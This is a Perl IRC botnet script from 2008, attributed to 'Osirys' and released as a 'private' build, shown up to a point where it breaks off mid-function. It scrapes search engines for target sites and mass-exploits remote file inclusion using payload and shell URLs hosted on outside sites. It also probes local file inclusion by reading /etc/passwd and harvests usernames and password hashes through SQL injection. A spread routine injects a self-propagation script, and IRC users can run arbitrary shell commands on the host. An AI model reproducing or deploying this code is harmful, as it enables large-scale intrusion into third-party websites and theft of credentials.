#!/usr/bin/perl

  #####################################################################################
  ##                                                                                 ##
  ##                                                                                 ##
  ##                                                                   04/04/2008    ##
  ##  Author  : Osirys                                                               ##
  ##  Team    : Third Eye Security                                                   ##
  ##  Ircd    : 84.19.176.186                                                        ##
  ##  WebSite :                                                                      ##
  ##  Contact : osirys[at]live[dot]it                                                ##
  ##                                                                                 ##
  ##  ## IMPORTANT ##                                                                ##
  ##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY          ##
  ##   # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !!                     ##
  ##   # THIS TOOL HAS BEEN MADE TO HELP NET ADMINISTRATORS TO MAKE THEIR            ##
  ##   # SYSTEM MORE SECURE.                                                         ##
  ##  ##                                                                             ##
  ##                                                                                 ##
  ##  Release: v5 Private                                                            ##
  ##    I coded this tool only for fun , anyway it works well ! This is a Private    ##
  ##    Release, so if you have this Script, please, take care, and don't give it    ##
  ##    anyone ! Thank you.                                                          ##
  ##    It's a IrcBot. So, after connecting on your Ircd, you can scan for RFI,      ##
  ##    LFI, SQL Injection on sites using dorks.                                     ##
  ##    Anyway, u may know, that this one is the better bot ever created !           ##
  ##    Be happy ! :D                                                                ##
  ##                                                                                 ##
  ##  Features:                                                                      ##
  ##    [+]Sql Injection Scanner                                                     ##
  ##    [+]Remote File Inclusion Scanner                                             ##
  ##    [+]Local File Inclusion Scanner                                              ##
  ##    [+]Integrated Shell, so you can execute commands on the server               ##
  ##    [+]Security Mode to protect "dangerous" fungctions                            ##
  ##    [+]Spread Mode, to activate or disable Spread Function                       ##
  ##    [+]Bypass Engines ON: Google, Yahoo                                          ##
  ##    !: To "bypass" these engines, the Scanner just looks for websites on other   ##
  ##    engines that use the same bots than the main ones                            ##
  ##                                                                                 ##
  ##                                                                                 ##
  #####################################################################################



### !!_/ PRIVATE

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

#######################################################
## CONFIGURATION                                     //
#######################################################


my $id    = "http://webraiders.com/wordpress/wp-content/uploads/22.txt?"; #Your RFI Response
my $shell = "http://rjoos.ch/Reise/images/tOtti/tOtti.txt??"; #Shell printed on the Vulnerable Site
my $ircd  = "romania.indoirc.net";
my $port  = "6667";
my $chan1 = "#kb0t"; #chan for Scan
my $chan2 = "#kb0t"; #results will be printed here too
my $nick  = "kl|Scan[".int(rand(100))."]";
my $sqlpidpr0c = 1; # This is the number of sites that the bot will test in the same time. For an accurated scann, it's reccomended to set a low number(1) 
# (Expecially if you are scanning on 0day bugs), so a lot of presunted vulnerable sites. Unless you will see the bot exiting by an excess flood!
# Instead, if you are scaning on old bugs, so not many results, you can put a higher number, so more speed.
my $rfipidpr0c = 50;

### USEFULL OPTIONS ( 0 => OFF  ;  1 => ON )

my $spread = "http://www.pinkandblackmedia.com/gallery/skins/spread.txt?";

my $spreadACT = 1; #0 ->disabled, 1 ->enabled
my $securityACT = 0; #0 ->disabled, 1 ->enabled

my $killpwd = "lol"; #Password to Kill the Bot
my $chidpwd = "lol"; #Password to change the RFI Response
my $cmdpwd = "lol"; #Password to execute commands on the server
my $secpwd = "lol";
my $spreadpwd = "lol";

my $badspreadpwd != $spreadpwd;
my $badkillpwd != $killpwd;
my $badidpwd != $chidpwd;
my $badcmdpwd =! $cmdpwd;


#######################################################
## END OF CONFIGURATION                              //
#######################################################

open( $f1le, ">", "rm.txt" );
print $f1le "\#!/usr/bin/perl\n";
print $f1le "exec(\"rm -rf \*siti\*\")\;\n";
close $f1le;


@help = (
"15,1[!] 9,1!response 15,1 > 11,1Test if the RFI Response is working ",
"15,1[!] 9,1!chid <new rfi-id> 15,1 > 11,1Change the RFI-Response ",
"15,1[!] 9,1!killme 15,1 > 11,1KILL The Bot ",
"15,1[!] 9,1!new rfi bugs 15,1 > 11,1Get the last 10 RFI bugs ",
"15,1[!] 9,1!new lfi bugs 15,1 > 11,1Get the last 10 LFI bugs ",
"15,1[!] 9,1!new sql-inj bugs 15,1 > 11,1Get the last 10 SQL Injection bugs ",
"15,1[!] 9,1!eco <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the RFI Scanner ",
"15,1[!] 9,1!lfi <bug> <dork> 15,1 > 11,1Start the LFI Scanner ",
"15,1[!] 9,1!sql <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the SQL Injection Scanner ",
"15,1[!] 9,1!cmd <bashline> 15,1 > 11,1Gives command on the Bot's shell. Ex: (!cmd id) (!cmd uname -a) ",
"15,1[!] 9,1/msg $nick !Sec ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Security Mode ",
"15,1[!] 9,1!Spread ON/OFF 15,1 > 11,1To enable or disable Spread Mode ",
"15,1[!] 9,1!info 15,1 > 11,1Get infos about the Bot "
);

my $sys = `uname -a`;
my $up = `uptime`;

if ($spreadACT == 0) {
    $t5 = "OFF";
}
elsif ($spreadACT == 1) {
    $t5 = "ON";
}

if ($securityACT == 0) {
    $y5 = "OFF";
}
elsif ($securityACT == 1) {
    $y5 = "ON";
}


$k=0;

if ( fork() == 0 ) {
    &irc( $ircd, $port, $chan1, $chan2, $nick );
}
else {
    exit;
}

sub irc () {
    my ( $ircd, $port, $chan1, $chan2, $nick ) = @_;
    $c0n = IO::Socket::INET->new(
        PeerAddr => "$ircd",
        PeerPort => "$port",
        Proto    => "tcp"
    ) or die "Can not connect on server!\n";
    $c0n->autoflush(1);
    print $c0n "NICK $nick\n";
    print $c0n "USER soldier 8 *  : Osirys\n";

    while ( $line = <$c0n> ) {

        my $sys = `uname -a`;
        my $up = `uptime`;

        if ($spreadACT == 0) {
            $t5 = "OFF";
        }
        elsif ($spreadACT == 1) {
            $t5 = "ON";
        }

        if ($securityACT == 0) {
            $y5 = "OFF";
        }
        elsif ($securityACT == 1) {
        $y5 = "ON";
        }

        @info = (
         "9,1[i] 15,1Release : 11,1v5-Private IrcBot ",
         "9,1[i] 15,1Author  : 11,1Osirys ",
         "9,1[i] 15,1Contact : 11,1osirys\@live.it ",
         "9,1[i] 15,1Uname -a: 11,1$sys ",
         "9,1[i] 15,1Uptime  : 11,1$up ",
         "9,1[i] 15,1Spread Mode: 11,1$t5 ",
         "9,1[i] 15,1Security Mode: 11,1$y5 "
        );
        

        $k++;



        if ( $line =~ /^PING \:(.*)/ ) {
            print $c0n "PONG :$1";
        }



        if ( $line =~ /001/ ) {
            print $c0n "JOIN $chan1\n";
            writ1("4,1_/9,1 V5-Private 11,1ON 7,1_>");
            writ1("4,1# Coded by Osirys ");
            print $c0n "JOIN $chan2\n";
        }



        if (( $line =~ /PRIVMSG $chan1 :!help/ ) && ($securityACT == 0)) {
            @help;
            foreach my $e(@help){
                writ1("$e");
            }
        }
        elsif (( $line =~ /PRIVMSG $chan1 :!help/ ) && ($securityACT == 1)) {
            @help;
            $help[1] = "15,1[!] 9,1/msg $nick !chid <new rfi-id> -p <pwd> 15,1 > 11,1Change the RFI-Response ";
            $help[2] = "15,1[!] 9,1/msg $nick !killme -p <pwd> 15,1 > 11,1KILL The Bot ";
            $help[9] = "15,1[!] 9,1/msg $nick !cmd <bashline> <pwd> 15,1 > 11,1Gives command on the Bot's shell. Ex: (!cmd id) ";
            $help[11] = "15,1[!] 9,1/msg $nick !Spread ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Spread Mode ";
            foreach my $e(@help){
                writ1("$e");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!info/) {
            @info;
            foreach my $n(@info) {
                writ1("$n");
            }
        }


        if ( $line =~ /PRIVMSG $chan1 :!new rfi bugs/ ) {
            my @re = query("nostrosito");
            writ1("15,1[+] 9,1Last 10 RFI bugs: ");
            foreach my $n (@re) {
                writ1(" 9,1$n ");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!new lfi bugs/ ) {
            my @re = query("nostrosito");
            writ1("15,1[+] 16,1Last 10 LFI bugs: ");
            foreach my $n (@re) {
                writ1(" 16,1$n ");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!new sql-inj bugs/ ) {
            my @re = query("nostrosito");
            writ1("15,1[+] 7,1Last 10 SQL Inj bugs: ");
            foreach my $n (@re) {
                writ1(" 7,1$n ");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!response/ ) {
            my $re = query($id);
            if ( $re =~ /Osirys/ ) {
                writ1("15,1[+] 12,9RFI Response is working ! ");
            }
            else {
                writ1("15,1[-] 12,4RFI Response is NOT working ! ");
            }
        }



        if (($line=~ /PRIVMSG $nick :!chid\s+(.*) -p $chidpwd/) && ($securityACT == 1)) {
            $newid = $1;
            $id = $newid;
            writ1("15,1[+] 9,1RFI Response changed ! ");
            writ1("15,1[+] 9,1New RFI Response: $id ");
        }
        elsif (($line=~ /PRIVMSG $nick :!chid\s+(.*) -p $badidpwd/) && ($securityACT == 1)) {
            writ1("15,1[-] 9,1Error Changing the RFI-Response (bad Password)! ");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!chid\s+(.*)/) && ($securityACT == 0)) {
            $newid = $1;
            $id = $newid;
            writ1("15,1[+] 9,1RFI Response changed ! ");
            writ1("15,1[+] 9,1New RFI Response: $id ");
        }



        if (($line=~ /PRIVMSG $nick :!plec -p $killpwd/) && ($securityACT == 1)) {
            writ1("15,1[!] 12,4Bye Bye ! ");
            print $c0n "QUIT";
            exec("perl rm.txt && pkill perl \n"); 
        }
        elsif (($line=~ /PRIVMSG $nick :!plec -p $badkillpwd/) && ($securityACT == 1)) {
            writ1("15,1[-] 12,4Error Killing the Bot (Null or bad Password) ! ");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!plec/) && ($securityACT == 0)) {
               writ1("15,1[!] 12,4Bye Bye ! ");
               print $c0n "QUIT";
               exec("perl rm.txt && pkill perl \n"); 
        }



        if (($line=~ /PRIVMSG $nick :!cmd\s+(.*) -p $cmdpwd/) && ($securityACT == 1) && (fork() == 0)) {
            my $cmd = $1;
            if ($cmd =~ /cd (.*)/) {
                chdir("$1") || priv8("Can't change dir"); 
                return;
            }
            my @output = `$1`;
            my $count = 0;
            foreach my $out(@output) {
                #$count++;
                #if ($count == 10) {
                    #sleep(3);
                    #$count = 0;
                #}
                priv8("15,1[+] 7,1$out ");
           }
           exit;
        }
        elsif  (($line=~ /PRIVMSG $nick :!cmd\s+(.*) -p $badcmdpwd/) && ($securityACT == 1) && (fork() == 0)) {
            priv8("15,1[-] 12,4Error using the shell (Null or bad Password) ! ");
        }
        elsif  (($line=~ /PRIVMSG $chan1 :!cmd\s+(.*)/) && ($securityACT == 0) && (fork() == 0)) {
            my $cmd = $1;
            if ($cmd =~ /cd (.*)/) {
                $dir = $1;
                chomp($dir);
                chdir ($dir) || writ1("Can't change dir"); 
            }
            my @output = `$1`;
            my $count = 0;
            foreach my $out(@output) {
                #$count++;
                #if ($count == 10) {
                    #sleep(3);
                    #$count = 0;
                #}
                writ1("15,1[+] 7,1$out ");
           }
           exit;
        }



        if ($line=~ /PRIVMSG $nick :!Sec\s+(.*) -p $secpwd/) {
            $s = $1;
            if ($s =~ /ON/) {
                $securityACT = 1;
                writ1("15,1[+] 12,9Security Mode Activated !!");
            }
            elsif ($s =~ /OFF/) {
                $securityACT = 0;
                writ1("15,1[+] 12,4Security Mode Disabled !!");
            }
        }



        if (($line=~ /PRIVMSG $nick :!Spread\s+(.*) -p $spreadpwd/) && ($securityACT == 1)) {
            $t = $1;
            if ($t =~ /ON/) {
                $spreadACT = 1;
                writ1("15,1[+] 12,9Spread Mode Activated !!");
            }
            elsif ($t =~ /OFF/) {
                $spreadACT = 0;
                writ1("15,1[+] 12,4Spread Mode Disabled !!");
            }
        }
        elsif (($line=~ /PRIVMSG $nick :!Spread\s+(.*) -p $badspreadpwd/) && ($securityACT == 1)) {
            writ1("15,1[-] 12,4Error changing the Spread Mode (Null or bad Password) ! ");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!Spread\s+(.*)/) && ($securityACT == 0)) {
            $t = $1;
            if ($t =~ /ON/) {
                $spreadACT = 1;
                writ1("15,1[+] 12,9Spread Mode Activated !!");
            }
            elsif ($t =~ /OFF/) {
                $spreadACT = 0;
                writ1("15,1[+] 12,4Spread Mode Disabled !!");
            }
        }



        if (($line =~ /PRIVMSG $chan1 :!scanx\s+(.*?)\s+(.*)\s+-p(.+[0-9])/) && (fork() == 0)) {
            my ($bug, $dork, $rfipid) = ($1, $2, $3);
            writ1("4,1[*] 9,1RFI Scan started -> $rfipid sites/process ");
            writ1("9,1[+] Bug: $bug");
            $d0rk = clean($dork);
            writ1("4,1[+] Dork: $d0rk");
            my $a    = $k . "a";
            my $n4me = $a . "siti.txt";
            find($d0rk, $n4me);
            rfi($bug, $n4me, $d0rk, $rfipid);
            writ1("4,1[-] RFI Scan finished 9,1 >15,1 $d0rk");
            writ1("11,1[?] # Coded by Osirys ");
            exit(0);
        }





        if (($line =~ /PRIVMSG $chan1 :!lfi\s+(.*?)\s+(.*)/) && (fork() == 0)) {
            my ($bug, $dork) = ($1, $2);
            writ1("4,1[*] 7,1LFI Scan started ");
            writ1("9,1[+] Bug: $bug");
            $d0rk = clean($dork);
            writ1("4,1[+] Dork: $d0rk");
            my $b    = $k . "b";
            my $n4me = $b . "siti.txt";
            find($d0rk, $n4me);
            lfi($bug, $n4me, $d0rk);
            writ1("4,1[-] LFI Scan finished 9,1 >15,1 $d0rk");
            writ1("11,1[?] # Coded by Osirys ");
            exit(0);
        }



        if (($line =~ /PRIVMSG $chan1 :!sql\s+(.*?)\s+(.*)\s+-p(.+[0-9])/) && (fork() == 0)) {
            my ($bug, $dork, $sqlpid) = ($1, $2, $3);
            writ1("4,1[*] 15,1SQL Inj Scan started -> $sqlpid sites/process ");
            writ1("9,1[+] Bug: $bug");
            $d0rk = clean($dork);
            writ1("4,1[+] Dork: $d0rk");
            my $c    = $k . "c";
            my $n4me = $c . "siti.txt";
            find($d0rk, $n4me);
            sql($bug, $n4me, $d0rk, $sqlpid);
            writ1("4,1[-] SQL Scan finished 9,1 >15,1 $d0rk");
            writ1("11,1[?] # Coded by Osirys ");
            exit(0);
        }
    }
}




sub find () {
    my $dork = $_[0];
    my $name = $_[1];
    my @engine;
    $engine[0] = fork();
    if ( $engine[0] == 0 ) {
        my @glist = google( $dork, $name );
        writ1("9,1[~] 7,1>GOOGLE : 11,1 ". scalar(@glist). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[1] = fork();
    if ( $engine[1] == 0 ) {
        my @all = alltheweb( $dork, $name );
        writ1("9,1[~] 7,1>ALLTHEWEB : 11,1 ". scalar(@all). " 9,1 > 15,1 $dork" );
        exit;
   }
    $engine[2] = fork();
    if ( $engine[2] == 0 ) {
        my @alt = altavista( $dork, $name );
        writ1("9,1[~] 7,1>ALTAVISTA : 11,1 ". scalar(@alt). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[3] = fork();
    if ( $engine[3] == 0 ) {
        my @emsn = msn( $dork, $name );
        writ1("9,1[~] 7,1>MSN : 11,1 ". scalar(@emsn). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[4] = fork();
    if ( $engine[4] == 0 ) {
        my @ysites = yahoo( $dork, $name );
        writ1("9,1[~] 7,1>YAHOO : 11,1 ". scalar(@ysites). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[5] = fork();
    if ( $engine[5] == 0 ) {
        my @asksites = ask( $dork, $name );
        writ1("9,1[~] 7,1>ASK : 11,1 ". scalar(@asksites). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[6] = fork();
    if ($engine[6] == 0) {
        my @aolsites = aol($dork,$name);
        writ1("9,1[~] 7,1>AOL : 11,1 ". scalar(@aolsites). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[7] = fork();
    if ( $engine[7] == 0 ) {
        my @dmozsites = dmoz( $dork, $name );
        writ1("9,1[~] 7,1>DMOZ : 11,1 ". scalar(@dmozsites). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[8] = fork();
    if ($engine[8] == 0) {
        my @webdesites = webde($dork,$name);
        writ1("9,1[~] 7,1>WEB.DE : 11,1 ". scalar(@webdesites). " 9,1 > 15,1 $dork" );
        exit;
    }
    $engine[9] = fork();
    if ($engine[9] == 0) {
        my @einetsites = einet($dork,$name);
        writ1("9,1[~] 7,1>eiNET.net : 11,1 ".scalar(@einetsites)." 9,1 > 15,1 $dork" );
        exit;
    }

    foreach my $e(@engine){
        waitpid($e,0);
    }

}

sub rfi () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = $_[3]; 
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ". scalar(@toexploit). "   15,1 $dork" );
    sleep(1);
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! " );
    foreach my $site (@toexploit) {
        my $test  = "http://" . $site . $bug . $id . "??";
        print "$test\n";
        $count++;
        if ( $count % $rfipid == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        if($count %100 == 0){
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ". $count. " 11,1 / 4,1 ". scalar(@toexploit). " ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug . $id . "??";
            my $print = "http://" . $site . $bug . $shell . "?";
            my $re    = query($test);
            if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
                os($test);
                writ1("12(12,9safe: OFF12) (12,9os: $os12) 12,9$print ");
                writ1("12(12,9uname -a12) 12 $un");
                writ1("12(12,9uid / gid12) 12 $id1");
                writ1("12(12,9hdd space12) 12 free: ($free) used: ($used) tot: ($all) ");
                writ2("");
                writ2("12(12,9safe: OFF12) (12,9os: $os12) 12,9$print ");
                writ2("12(12,9uname -a12) 12 $un 12(12,9uid12)12 $id1");
                if ( $spreadACT == 1 ) {
                    writ1("15,1[+] 9,1Trying to spread .. ");
                    sleep(2);
                    my $test2 = "http://" . $site . $bug . $spread . "?";
                    my $reqz  = query($test2);
                }
            }
            elsif ( $re =~ /Osirys/ ) {
                os($test);
                writ1("12(12,4safe: ON12) (12,4os: $os12) 12,4$print ");
                writ1("12(12,4uname -a12) 12 $un");
                writ1("12(12,4uid / gid12) 12 $id1");
                writ1("12(12,4hdd space12) 12 free: ($free) used: ($used) tot: ($all) ");
                writ2("");
                writ2("12(12,4safe: ON12) (12,4os: $os12) 12,4$print ");
                if ( $spreadACT == 1 ) {
                    writ1("15,1[+] 9,1Trying to spread .. ");
                    sleep(2);
                    my $test2 = "http://" . $site . $bug . $spread . "?";
                    my $reqz  = query($test2);
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub lfi () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ". scalar(@toexploit). "   15,1 $dork" );
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! " );
    foreach my $site (@toexploit) {
        $count++;
        if ( $count % 100 == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        if ( $count % 300 == 0 ) {
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ". $count. " 11,1 / 4,1 ". scalar(@toexploit). " ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $inj   = "../../../../../../../../../../../../../etc/passwd%00";
            my $test  = "http://" . $site . $bug . $inj;
            my $print = "http://" . $site . $bug . $inj;
            my $re    = query($test);
            if ( $re =~ /root:x:/ ) {
                writ1("7(7,1LFI7) 9,1$print");
                writ2("7(7,1LFI7) 9,1$print");
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub sql () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2]; 
    my $sqlpid = $_[3]; 
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ". scalar(@toexploit). "   15,1 $dork" );
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! " );
    foreach my $site (@toexploit) {
        my $test  = "http://" . $site . $bug;
        print "$test\n";
        $count++;
        if($count %$sqlpid == 0){
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
	}
        if($count %100 == 0){
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ". $count. " 11,1 / 4,1 ". scalar(@toexploit). " ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug;
            my $print = "http://" . $site . $bug;
            my $re    = query($test);
            if ( $re =~ /(.*):(.*)([0-9,a-f]{32})/ ) { 
                my ($user,$hash) = ($2,$3);
                $user =~ s/\<(.*)\>//g;
                if ($user !~ /(\/|\<|\>|\")/) {
                    if ($sqlpid == $sqlpidpr0c) {
                        writ1("9(9,12SQL INJ9) 15,12$print");
                        writ1("9(9,12User9) 15,12$user");
                        writ1("9(9,12Hash9) 15,12$hash");
                        writ2("9(9,12SQL INJ9) 15,12$print");
                    }
                    elsif  ($sqlpid > $sqlpidpr0c) { 
                        writ1("9(9,12SQL INJ9) 15,12$print");
                    }
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub google () {
    my @gsites;
    my $key = $_[0];
    my $name = $_[1];
    my $gtest = ("www.google.co.th/search?q=hi&hl=en&start=10&sa=N");
    my $ret = query1($gtest);
    if ($ret =~ /2008 Google/) {
        @gsites = gfind($key,$name);
    }
    else {
        writ1("4,1[!] 4,1Banned by Google Engine, trying to bypass it !");
        @gsites = gbypass($key,$name);
    }
    return @gsites;
}

sub gfind () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1900; $p += 100) {
        my $g0gle = ("www.google.co.th/search?q=".key($key)."&num=100&hl=it&as_qdr=all&start=".$p."&sa=N");
        my $gr = query1($g0gle);
        while ($gr =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $k = $1;
            if ($k !~ /google/) {
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push(@list, @grep);
            }
        }
    }
    return @list;
}

sub gbypass () { # Euroseek uses the same search type of google
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $p = 0 ; $p <= 1000 ; $p += 10 ) {
        my $gp = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".key($key));
        my $re = query($gp);
        while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/g ) {
            my $k = $1;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$k\n";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub alltheweb() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $All = ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=". key($key) . "&o=". $i );
        my $re = query($All);
        while ( $re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$k\n";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub altavista() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ($b = 1;$b <= 1000;$b += 10) {
        my $Alt = ( "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=". key($key) . "&stq=". $b );
        my $re = query($Alt);
        while ( $re =~ m/<span class=ngrn>(.+?)\//g ) {
            if ( $1 !~ /altavista/ ) {
                my $k = $1;
                $k =~ s/<//g;
                $k =~ s/ //g;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
        if ( $re =~ /target=\"_self\">Succ/ ) { }
        else {
            return @lst;
        }
    }
    return @lst;
}

sub msn() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $Msn = ( "http://search.live.com/results.aspx?q=". key($key). "&first=". $b. "&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub yahoo () {
    my @ysites;
    my $key = $_[0];
    my $name = $_[1];
    my $ytest = ("http://www.search.yahoo.com/search?p=hello&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=1");
    my $ret = query($ytest);
    if ($ret =~ /We did not find results for/) {
        return @ysites;
    }
    elsif ($ret =~ /title=\"Yahoo! Search results for hello\"/) {
        @ysites = yfind($key,$name);
        return @ysites;
    }
    else {
        writ1("4,1[!] 4,1Banned by Yahoo Engine, trying to bypass it !");
        @ysites = ybypass($key,$name);
        return @ysites;
    }
}

sub yfind() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
        for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
            my $ylink = ( "http://search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
            my $re = query($ylink);
            while ( $re =~ m/<a class=\"yschttl\" href=\"http:\/\/(.+?)\" >/g ) {
                my $k = $1;
                if ($k !~ /yahoo|<b>/) {
                    my @grep = links($k);
                    open( $filez, ">>", $name );
                    foreach my $k (@grep) {
                        print $filez "$k\n";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
    return @lst;
}  

sub ybypass () { # GoodSearch uses the same search type of Yahoo
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    my $ybytest = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=1&osmax=16");
    my $res = query($ybytest);
    if ($res =~ /Your search did not yield any results/){
        return @lst;
    }
    else {
        for $p(1..50){
            my $ybylink = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=".$p."&osmax=16");
            my $rek = query($ybylink);
            while ($rek =~ m/href=\"(.+?)\">(.+?)<\/a>/g) {
                my $tsite = $2;
                if (($tsite =~ /\./) && ($tsite !~ /<|>| /)){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsite\n";
                    }
                    close $filez;
                    push( @lst, @grep );   
                }       
            }
        }
        return @lst;
    }
} 


sub ask () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $askt = ("http://it.ask.com/web?q=".key($key)."&qsrc=1&o=312&l=dir&dm=all");
    my $asktest = query($askt);
    if ($asktest =~ /non ha prodotto alcun risultato/) {
        return @lst;
    }
    else {
        for ($p=0;$p<=210;$p++){
            my $asklink = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$p);
            my $re = query($asklink);
            while($re =~ m/href=\"http:\/\/(.+?)\"/g){
                my $tsite = $1;
                if ($tsite !~ /ask|wikipedia/){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsite\n";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
        return @lst;
    }
}

sub aol () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $aolt = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($key));
    my $atest = query($aolt);
    if ($atest =~ /returned no results.<\/h3>/) {
        return @lst;
    }
    else {
        for ($p=1;$p<=200;$p++){
            my $aollink = ("http://search.aol.com/aol/search?query=".key($key)."&page=".$p."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
            my $re = query($aollink);
            while($re =~ m/<p class=\"durl find\" property=\"f:durl\">(.+?)\n-/g) {
                my $tsite = $1;
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsite\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    return @lst;
    }
}     

sub dmoz () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $dmtest = ("http://search.dmoz.org/cgi-bin/search?search=".key($key));
    my $dmq = query($dmtest);
    if ($dmq =~ /No <b><a href=\"http:\/\/dmoz.org\/\">Open Directory Project<\/a><\/b> results found/){
        return @lst;
    }
    elsif ($dmq =~ /of (.+?)\)<p>/){
        my $ftot = $1;
        if ($ftot <= 20) {
            $max = 1;
        }
        else {
            my $to = $ftot / 20;
            if ($to =~ /(.+).(.+?)/){
                $uik = $1 * 20;
                $max = $uik +1;
            }
            elsif ($to =~ /[0-9]/) {
                my $to--;
                my $rej = $to * 20;
                $max = $rej +1;
            }
        }   
    }    
    for ($p=1;$p<=$max;$p += 20){
